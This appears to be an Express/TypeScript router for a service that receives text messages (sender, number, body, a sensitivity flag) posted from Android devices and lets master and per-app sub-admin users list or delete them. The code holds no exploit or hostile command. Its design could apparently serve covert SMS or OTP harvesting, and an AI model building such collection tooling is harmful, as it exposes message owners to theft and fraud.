import { Router, type IRouter } from "express";
import { localDb } from "../lib/local-db";
import { pool } from "../lib/db";
import { sseEmit } from "../lib/sse";
import { requireAppSecret } from "../middlewares/appSecret";
import { requireAnyJwt } from "../middlewares/requireJwt";

const router: IRouter = Router();

// GET — master ya sub-admin JWT zaroori
router.get("/messages", requireAnyJwt, async (req, res) => {
  const { userId, deviceId, appId } = req.query;

  // Sub-admin: sirf apna appId
  if (req.tokenRole === "sub-admin") {
    const rows = await localDb.listMessages({ appId: req.subAdminAppId });
    res.json(rows);
    return;
  }

  // Master: normal filter
  const rows = await localDb.listMessages({
    appId: appId ? String(appId) : undefined,
    userId: !appId && userId ? String(userId) : undefined,
    deviceId: !appId && !userId && deviceId ? String(deviceId) : undefined,
  });
  res.json(rows);
});

// POST — Android device se aata hai, appSecret se protected
router.post("/messages", requireAppSecret, async (req, res) => {
  const { appId, deviceId, userId, fromSender, fromNumber, body, isSensitive } = req.body as Record<string, unknown>;
  if (!appId || !deviceId || !fromNumber || !body) {
    res.status(400).json({ error: "appId, deviceId, fromNumber and body are required" });
    return;
  }
  const uid = String(userId ?? `USR-${String(deviceId).slice(-6).toUpperCase()}`);
  const inserted = await localDb.createMessage({
    appId: String(appId),
    deviceId: String(deviceId),
    userId: uid,
    fromSender: String(fromSender ?? "Unknown"),
    fromNumber: String(fromNumber),
    body: String(body),
    isSensitive: Boolean(isSensitive ?? false),
  });
  sseEmit("message_added", { appId: String(appId), message: inserted });
  res.status(201).json({ ok: true, id: inserted.id });
});

// DELETE — master ya sub-admin JWT zaroori, sub-admin sirf apna
router.delete("/messages/:id", requireAnyJwt, async (req, res) => {
  const id = Number(req.params.id);
  if (Number.isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }

  // Sub-admin: ownership check
  if (req.tokenRole === "sub-admin") {
    const { rows } = await pool.query<{ app_id: string }>(
      `SELECT app_id FROM messages WHERE id = $1`, [id]
    );
    if (!rows[0]) { res.status(404).json({ error: "Not found" }); return; }
    if (rows[0].app_id !== req.subAdminAppId) {
      res.status(403).json({ error: "Forbidden: this message does not belong to your app" });
      return;
    }
  }

  const row = await localDb.deleteMessage(id);
  if (!row) { res.status(404).json({ error: "Not found" }); return; }
  sseEmit("message_deleted", { appId: row.appId, deviceId: row.deviceId, id });
  res.json({ ok: true });
});

export default router;
